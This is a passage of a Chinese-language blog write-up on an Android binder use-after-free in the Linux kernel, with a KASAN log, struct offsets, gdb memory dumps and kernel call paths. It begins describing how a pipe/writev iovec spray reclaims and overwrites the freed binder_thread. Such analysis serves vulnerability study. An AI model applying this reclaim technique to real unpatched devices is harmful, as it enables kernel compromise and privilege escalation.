报告</li>\n</ol>\n<p>日志中你看到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[   77.771718] ==================================================================</span><br><span class=\"line\">[   77.773904] BUG: KASAN: use-after-free in remove_wait_queue+0x1d4/0x1f0</span><br><span class=\"line\">[   77.774237] Write of size 8 at addr ffff8000d3062128 by task test/1351</span><br><span class=\"line\">[   77.774506] </span><br><span class=\"line\">[   77.774991] CPU: 0 PID: 1351 Comm: test Not tainted 4.14.16-00144-g7a3cee43e935-dirty #3</span><br><span class=\"line\">[   77.775385] Hardware name: linux,dummy-virt (DT)</span><br><span class=\"line\">[   77.776218] Call trace:</span><br><span class=\"line\">[   77.776427] [&lt;ffff200008092658&gt;] dump_backtrace+0x0/0x4c0</span><br><span class=\"line\">[   77.776715] [&lt;ffff200008092b2c&gt;] show_stack+0x14/0x20</span><br><span class=\"line\">[   77.776943] [&lt;ffff200009c4b3ec&gt;] dump_stack+0x110/0x18c</span><br><span class=\"line\">[   77.777157] [&lt;ffff20000849f5dc&gt;] print_address_description+0x64/0x258</span><br><span class=\"line\">[   77.777381] [&lt;ffff20000849f048&gt;] kasan_report+0x158/0x308</span><br><span class=\"line\">[   77.777577] [&lt;ffff20000849f354&gt;] __asan_report_store8_noabort+0x1c/0x28</span><br><span class=\"line\">[   77.777790] [&lt;ffff2000081f514c&gt;] remove_wait_queue+0x1d4/0x1f0</span><br><span class=\"line\">[   77.777962] [&lt;ffff2000085cea88&gt;] ep_unregister_pollwait.isra.0+0x1b8/0x308</span><br><span class=\"line\">[   77.778153] [&lt;ffff2000085d1e40&gt;] ep_free+0xf0/0x210</span><br><span class=\"line\">[   77.778365] [&lt;ffff2000085d1f8c&gt;] ep_eventpoll_release+0x2c/0x48</span><br><span class=\"line\">[   77.778618] [&lt;ffff2000084f7734&gt;] __fput+0x22c/0x620</span><br><span class=\"line\">[   77.778800] [&lt;ffff2000084f7bac&gt;] ____fput+0xc/0x18</span><br><span class=\"line\">[   77.778978] [&lt;ffff20000818a020&gt;] task_work_run+0x150/0x1d8</span><br><span class=\"line\">[   77.779174] [&lt;ffff200008140114&gt;] do_exit+0x73c/0x1208</span><br><span class=\"line\">[   77.779360] [&lt;ffff200008140d30&gt;] do_group_exit+0x108/0x2b0</span><br><span class=\"line\">[   77.779590] [&lt;ffff200008140ef4&gt;] SyS_exit_group+0x1c/0x20</span><br><span class=\"line\">[   77.779951] Exception stack(0xffff8000d3b1fec0 to 0xffff8000d3b20000)</span><br></pre></td></tr></table></figure>\n<p>这正是上面第 3 步中，remove_wait_queue() 在一个已经被 kfree 的 wait_queue_head_t 上操作导致的野指针写，KASAN 立刻捕捉到，并在尝试解除锁链时崩溃。</p>\n<p>⸻</p>\n<p>漏洞触发总结</p>\n<ol>\n<li>   epoll_ctl(ADD) 调用 binder_poll，将 thread-&gt;wait 加入 epoll 等待列表。</li>\n<li>   ioctl(BINDER_THREAD_EXIT) 释放 binder_thread 结构（包含 wait 字段）。</li>\n<li>   进程退出 / epoll FD 关闭 时，ep_eventpoll_release 调用 remove_wait_queue(&amp;thread-&gt;wait, …)。</li>\n<li>   thread-&gt;wait 已被释放，remove_wait_queue 执行 UAF 写操作，KASAN 捕获并报错。</li>\n</ol>\n<p>⸻</p>\n<p>代码位置参考<br>•    注册 wait queue：drivers/android/binder.c 中的 binder_poll() → poll_wait(…, &amp;thread-&gt;wait, …)<br>•    释放线程：drivers/android/binder.c 中的 binder_thread_release() → kfree(thread)<br>•    清理 epoll：fs/eventpoll.c 中的 ep_eventpoll_release() → ep_free() → ep_unregister_pollwait() → remove_wait_queue()</p>\n<h2 id=\"UAF利用-poc-c\"><a href=\"#UAF利用-poc-c\" class=\"headerlink\" title=\"UAF利用 poc.c\"></a>UAF利用 poc.c</h2><p>binder_thread</p>\n<p>结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_thread</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_proc</span> *<span class=\"title\">proc</span>;</span> <span class=\"comment\">//0x8</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rb_node</span> <span class=\"title\">rb_node</span>;</span> <span class=\"comment\">//0x18</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> <span class=\"title\">waiting_thread_node</span>;</span> <span class=\"comment\">//0x10</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> pid;<span class=\"comment\">//0x4</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> looper; <span class=\"comment\">//0x4             /* only modified by this thread */</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> looper_need_return; <span class=\"comment\">/* can be written by other thread */</span> <span class=\"comment\">//0x1 实际 0x8</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_transaction</span> *<span class=\"title\">transaction_stack</span>;</span> <span class=\"comment\">//0x8</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> <span class=\"title\">todo</span>;</span> <span class=\"comment\">//0x10</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_error</span> <span class=\"title\">return_error</span>;</span><span class=\"comment\">//0x20</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_error</span> <span class=\"title\">reply_error</span>;</span><span class=\"comment\">//0x20</span></span><br><span class=\"line\">\t<span class=\"type\">wait_queue_head_t</span> wait;<span class=\"comment\">//0x18</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_stats</span> <span class=\"title\">stats</span>;</span><span class=\"comment\">//0xcc</span></span><br><span class=\"line\">\t<span class=\"type\">atomic_t</span> tmp_ref;<span class=\"comment\">//0x4</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> is_dead;<span class=\"comment\">//0x1</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>调试显示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(remote) gef➤  print *thread</span><br><span class=\"line\">$3 = &#123;</span><br><span class=\"line\">  proc = 0xffff8000d63c3c80,</span><br><span class=\"line\">  rb_node = &#123;</span><br><span class=\"line\">    __rb_parent_color = 0x1,</span><br><span class=\"line\">    rb_right = 0x0,</span><br><span class=\"line\">    rb_left = 0x0</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  waiting_thread_node = &#123;</span><br><span class=\"line\">    next = 0xffff8000d30c58a0,</span><br><span class=\"line\">    prev = 0xffff8000d30c58a0</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  pid = 0x545,</span><br><span class=\"line\">  looper = 0x20,</span><br><span class=\"line\">  looper_need_return = 0x1,</span><br><span class=\"line\">  transaction_stack = 0x0,</span><br><span class=\"line\">  todo = &#123;</span><br><span class=\"line\">    next = 0xffff8000d30c58c8,</span><br><span class=\"line\">    prev = 0xffff8000d30c58c8</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  return_error = &#123;</span><br><span class=\"line\">    work = &#123;</span><br><span class=\"line\">      entry = &#123;</span><br><span class=\"line\">        next = 0x0,</span><br><span class=\"line\">        prev = 0x0</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      type = BINDER_WORK_RETURN_ERROR</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    cmd = 0x7201</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  reply_error = &#123;</span><br><span class=\"line\">    work = &#123;</span><br><span class=\"line\">      entry = &#123;</span><br><span class=\"line\">        next = 0x0,</span><br><span class=\"line\">        prev = 0x0</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      type = BINDER_WORK_RETURN_ERROR</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    cmd = 0x7201</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  wait = &#123;</span><br><span class=\"line\">    lock = &#123;</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        rlock = &#123;</span><br><span class=\"line\">          raw_lock = &#123;</span><br><span class=\"line\">            owner = 0x1,</span><br><span class=\"line\">            next = 0x1</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    head = &#123;</span><br><span class=\"line\">      next = 0xffff8000d3924038,</span><br><span class=\"line\">      prev = 0xffff8000d3924038</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  stats = &#123;</span><br><span class=\"line\">    br = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125; &lt;repeats 18 times&gt;&#125;,</span><br><span class=\"line\">    bc = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125; &lt;repeats 19 times&gt;&#125;,</span><br><span class=\"line\">    obj_created = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;&#125;,</span><br><span class=\"line\">    obj_deleted = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  tmp_ref = &#123;</span><br><span class=\"line\">    counter = 0x0</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  is_dead = 0x0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">(remote) gef➤  print sizeof(*thread)</span><br><span class=\"line\">$4 = 0x188</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  print thread</span><br><span class=\"line\">$8 = (struct binder_thread *) 0xffff8000d30c5880</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  print &amp;(thread-&gt;wait)</span><br><span class=\"line\">$6 = (wait_queue_head_t *) 0xffff8000d30c5918</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  print &amp;(thread-&gt;wait-&gt;head)</span><br><span class=\"line\">$7 = (struct list_head *) 0xffff8000d30c5920</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  x/31gx thread  --&gt;小端展示，低位低地址</span><br><span class=\"line\">0xffff8000d30c5880:\t0xffff8000d63c3c80\t0x0000000000000001</span><br><span class=\"line\">0xffff8000d30c5890:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c58a0:\t0xffff8000d30c58a0\t0xffff8000d30c58a0</span><br><span class=\"line\">0xffff8000d30c58b0:\t0x0000002000000545\t0x0000000000000001</span><br><span class=\"line\">0xffff8000d30c58c0:\t0x0000000000000000\t0xffff8000d30c58c8</span><br><span class=\"line\">0xffff8000d30c58d0:\t0xffff8000d30c58c8\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c58e0:\t0x0000000000000000\t0x0000000000000003</span><br><span class=\"line\">0xffff8000d30c58f0:\t0x0000000000007201\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5900:\t0x0000000000000000\t0x0000000000000003</span><br><span class=\"line\">0xffff8000d30c5910:\t0x0000000000007201\t0x0000000000010001</span><br><span class=\"line\">0xffff8000d30c5920:\t0xffff8000d3924038\t0xffff8000d3924038</span><br><span class=\"line\">0xffff8000d30c5930:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5940:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5950:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5960:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5970:\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p> 哪里持有 binder_thread-&gt;wait</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">// fs/eventpoll.c</span></span><br><span class=\"line\">SYSCALL_DEFINE4(epoll_ctl, <span class=\"type\">int</span>, epfd, <span class=\"type\">int</span>, op, <span class=\"type\">int</span>, fd,</span><br><span class=\"line\">\t\t<span class=\"keyword\">struct</span> epoll_event __user *, event)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \t<span class=\"keyword\">switch</span> (op) &#123;</span><br><span class=\"line\">\t  <span class=\"keyword\">case</span> EPOLL_CTL_ADD:</span><br><span class=\"line\">\t\t\terror = ep_insert(ep, &amp;epds, tf.file, fd, full_check);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ep_insert</span><span class=\"params\">(<span class=\"keyword\">struct</span> eventpoll *ep, <span class=\"keyword\">struct</span> epoll_event *event,</span></span><br><span class=\"line\"><span class=\"params\">\t\t     <span class=\"keyword\">struct</span> file *tfile, <span class=\"type\">int</span> fd, <span class=\"type\">int</span> full_check)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \tep_set_ffd(&amp;epi-&gt;ffd, tfile, fd);<span class=\"comment\">// poll: file</span></span><br><span class=\"line\">  \tinit_poll_funcptr(&amp;epq.pt, ep_ptable_queue_proc); <span class=\"comment\">// poll: poll_table</span></span><br><span class=\"line\"></span><br><span class=\"line\">\trevents = ep_item_poll(epi, &amp;epq.pt);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">ep_item_poll</span><span class=\"params\">(<span class=\"keyword\">struct</span> epitem *epi, poll_table *pt)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpt-&gt;_key = epi-&gt;event.events;</span><br><span class=\"line\">  <span class=\"comment\">//调用binder fd的 poll 方法</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> epi-&gt;ffd.file-&gt;f_op-&gt;poll(epi-&gt;ffd.file, pt) &amp; epi-&gt;event.events;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----&gt; 调用到 /drivers/android/binder.c</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">binder_poll</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *filp,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"keyword\">struct</span> poll_table_struct *wait)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \tpoll_wait(filp, &amp;thread-&gt;wait, wait);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----&gt; 调用到 /include/linux/poll.h</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">poll_wait</span><span class=\"params\">(<span class=\"keyword\">struct</span> file * filp, <span class=\"type\">wait_queue_head_t</span> * wait_address, poll_table *p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p &amp;&amp; p-&gt;_qproc &amp;&amp; wait_address)</span><br><span class=\"line\">\t\tp-&gt;_qproc(filp, wait_address, p);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ----&gt; 即回调到 /fs/eventpoll.c</span></span><br><span class=\"line\"><span class=\"comment\">//[#0] 0xffff0000082492f0 → ep_ptable_queue_proc(file=0xffff8000fae61900, whead=0xffff8000f8bb6c98, pt=0xffff00000ace3ea8)</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">ep_ptable_queue_proc</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">wait_queue_head_t</span> *whead,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t poll_table *pt)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epitem</span> *<span class=\"title\">epi</span> =</span> ep_item_from_epqueue(pt);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">eppoll_entry</span> *<span class=\"title\">pwq</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (epi-&gt;nwait &gt;= <span class=\"number\">0</span> &amp;&amp; (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) &#123;</span><br><span class=\"line\">\t\tinit_waitqueue_func_entry(&amp;pwq-&gt;wait, ep_poll_callback);</span><br><span class=\"line\">\t\tpwq-&gt;whead = whead;</span><br><span class=\"line\">\t\tpwq-&gt;base = epi;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (epi-&gt;event.events &amp; EPOLLEXCLUSIVE)</span><br><span class=\"line\">\t\t\tadd_wait_queue_exclusive(whead, &amp;pwq-&gt;wait);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tadd_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class=\"line\">\t\tlist_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist);</span><br><span class=\"line\">\t\tepi-&gt;nwait++;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">/* We have to signal that an error occurred */</span></span><br><span class=\"line\">\t\tepi-&gt;nwait = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//把epoll的wwait_queue_entry_t 加入到以binder_thread-&gt;wait(whead)头为准的队列中，且此头指针被eppoll_entry-&gt;whead持有</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//此eppoll_entry 又通过list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist); 加到了poll wait queues</span></span><br></pre></td></tr></table></figure>\n\n<p>  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[#0] 0xffff000008840618 → binder_thread_release(proc=0xffff8000f8bbd800, thread=0xffff8000f8bb6c00)</span><br><span class=\"line\"></span><br><span class=\"line\">0xffff8000f8bb6c90:\t0x0000000000007201\t0x0000000000010001</span><br><span class=\"line\">0xffff8000f8bb6ca0:\t0xffff8000f8ed7030\t0xffff8000f8ed7030</span><br></pre></td></tr></table></figure>\n<p>制造free point</p>\n<p>binder_thread 整个被释放 0x188 字节<br>如何申请到binder_thread 释放的这块结构体的内存</p>\n<p>即利用管道的 copy from user 来覆盖binder_thread 结构体</p>\n<ol>\n<li><p>把管道容量调成一页<br>fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000);<br>这样管道的最大缓冲区就只有 0x1000 字节（1 页）。</p>\n</li>\n<li><p>   第 10 个 iovec 刚好写入一页数据<br>iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000;</p>\n</li>\n<li><p>   管道满了就阻塞写<br>在 writev() 执行到第 10 个 iovec，把那整页数据写进管道后，管道就“满”了。此时内核的 pipe_write() 会发现没有更多空间，于是把当前写操作挂起（阻塞）——也就是在这一行代码里阻塞，直到有读端把管道读空一点。<br>待确认问题：writev卡在哪里？，以便于EPOLL_CTL_DEL 触发<br>copy_from_user 将vec 覆盖binder_thread<br>(remote) gef➤  x/26gx 0xffff8000f88b1000<br>0xffff8000f88b1000:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1010:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1020:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1030:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1040:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1050:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1060:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1070:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1080:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1090:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b10a0:    0x0000000100000000    0x0000000000001000<br>0xffff8000f88b10b0:    0x00000000beefdead    0x0000000000001000<br>0xffff8000f88b10c0:    0x0000000000000000    0x0000000000000000</p>\n</li>\n<li><p>writev 申请到free point指向的内存<br>writev<br>do_writev<br>vfs_readv<br>import_iovec<br>rw_copy_check_uvector</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//read_write.c</span></span><br><span class=\"line\">ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &amp;iov, &amp;iter);</span><br></pre></td></tr></table></figure>\n<p>内部会调用 rw_copy_check_uvector()，当用户传入的 vlen（这里是 25）大于 UIO_FASTIOV（通常是 16）时，它就会走到这段代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 